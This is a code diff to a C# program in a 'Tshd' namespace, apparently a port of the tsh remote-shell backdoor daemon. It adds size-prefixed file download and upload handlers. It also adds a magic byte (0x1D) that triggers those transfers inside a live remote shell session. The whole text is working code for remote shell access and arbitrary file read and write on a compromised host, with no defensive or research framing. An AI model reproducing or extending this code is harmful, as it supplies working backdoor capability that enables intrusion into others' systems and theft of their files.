@@ -119,10 +119,10 @@ namespace Tshd
             switch (buf[0])
             {
                 case 1: // GetFile
-                    HandleGetFile(layer);
+                    HandleGetFile(layer, null);
                     break;
                 case 2: // PutFile
-                    HandlePutFile(layer);
+                    HandlePutFile(layer, null);
                     break;
                 case 3: // RunShell
                     HandleRunShell(layer);
@@ -130,25 +130,45 @@ namespace Tshd
             }
         }
 
-        static void HandleGetFile(Pel layer)
+        static void HandleGetFile(Pel layer, byte[] initialData)
         {
             byte[] buf = new byte[4096];
-            int n = layer.Read(buf, 0, buf.Length);
-            if (n <= 0) return;
-            string filename = Encoding.UTF8.GetString(buf, 0, n);
+            string filename;
+
+            if (initialData != null && initialData.Length > 0)
+            {
+                filename = Encoding.UTF8.GetString(initialData);
+            }
+            else
+            {
+                int n = layer.Read(buf, 0, buf.Length);
+                if (n <= 0) return;
+                filename = Encoding.UTF8.GetString(buf, 0, n);
+            }
 
             if (File.Exists(filename))
             {
                 try
                 {
+                    long size = new FileInfo(filename).Length;
                     using (FileStream fs = File.OpenRead(filename))
                     {
+                        // Send ACK 0x1D 0x01
+                        layer.Write(new byte[] { 0x1D, 1 }, 0, 2);
+
                         layer.Write(new byte[] { 1 }, 0, 1); // Success
+
+                        // Send Size (Big Endian)
+                        byte[] sizeBuf = new byte[8];
+                        for (int i = 0; i < 8; i++) sizeBuf[i] = (byte)(size >> (56 - 8 * i));
+                        layer.Write(sizeBuf, 0, 8);
+
                         CopyStream(layer, fs, buf);
                     }
                 }
                 catch (Exception ex)
                 {
+                    layer.Write(new byte[] { 0x1D, 1 }, 0, 2); // ACK
                     layer.Write(new byte[] { 0 }, 0, 1); // Failure
                     byte[] err = Encoding.UTF8.GetBytes(ex.Message);
                     layer.Write(err, 0, err.Length);
@@ -156,29 +176,51 @@ namespace Tshd
             }
             else
             {
+                layer.Write(new byte[] { 0x1D, 1 }, 0, 2); // ACK
                 layer.Write(new byte[] { 0 }, 0, 1); // Failure
                 byte[] err = Encoding.UTF8.GetBytes("File not found");
                 layer.Write(err, 0, err.Length);
             }
         }
 
-        static void HandlePutFile(Pel layer)
+        static void HandlePutFile(Pel layer, byte[] initialData)
         {
             byte[] buf = new byte[4096];
-            int n = layer.Read(buf, 0, buf.Length);
-            if (n <= 0) return;
-            string filename = Encoding.UTF8.GetString(buf, 0, n);
+            string filename;
+
+            if (initialData != null && initialData.Length > 0)
+            {
+                filename = Encoding.UTF8.GetString(initialData);
+            }
+            else
+            {
+                int n = layer.Read(buf, 0, buf.Length);
+                if (n <= 0) return;
+                filename = Encoding.UTF8.GetString(buf, 0, n);
+            }
 
             try
             {
                 using (FileStream fs = File.Create(filename))
                 {
+                    // Send ACK 0x1D 0x02
+                    layer.Write(new byte[] { 0x1D, 2 }, 0, 2);
+
                     layer.Write(new byte[] { 1 }, 0, 1); // Success
-                    CopyStream(fs, layer, buf);
+
+                    // Recv Size
+                    byte[] sizeBuf = new byte[8];
+                    int n = layer.Read(sizeBuf, 0, 8);
+                    if (n != 8) return;
+                    long size = 0;
+                    for (int i = 0; i < 8; i++) size = (size << 8) | (long)sizeBuf[i];
+
+                    CopyStreamN(fs, layer, buf, size);
                 }
             }
             catch (Exception ex)
             {
+                layer.Write(new byte[] { 0x1D, 2 }, 0, 2); // ACK
                 layer.Write(new byte[] { 0 }, 0, 1); // Failure
                 byte[] err = Encoding.UTF8.GetBytes(ex.Message);
                 layer.Write(err, 0, err.Length);
@@ -229,6 +271,19 @@ namespace Tshd
                      List<byte> exitBuffer = new List<byte>();
 
                      while ((readLen = layer.Read(tmp, 0, tmp.Length)) > 0) {
+                         // Check for magic command byte 0x1D
+                         if (readLen >= 2 && tmp[0] == 0x1D) {
+                             int opcode = tmp[1];
+                             byte[] extra = null;
+                             if (readLen > 2) {
+                                 extra = new byte[readLen - 2];
+                                 Array.Copy(tmp, 2, extra, 0, readLen - 2);
+                             }
+
+                             if (opcode == 1) { HandleGetFile(layer, extra); continue; }
+                             if (opcode == 2) { HandlePutFile(layer, extra); continue; }
+                         }
+
                          for (int i = 0; i < readLen; i++)
                          {
                              byte b = tmp[i];
@@ -379,6 +434,20 @@ namespace Tshd
             {
                 dst.Write(buf, 0, n);
                 dst.Flush();
+            }
+        }
+
+        static void CopyStreamN(Stream dst, Stream src, byte[] buf, long count)
+        {
+            long total = 0;
+            while (total < count)
+            {
+                int toRead = (int)Math.Min(buf.Length, count - total);
+                int n = src.Read(buf, 0, toRead);
+                if (n <= 0) break;
+                dst.Write(buf, 0, n);
+                dst.Flush();
+                total += n;
             }
         }
     }
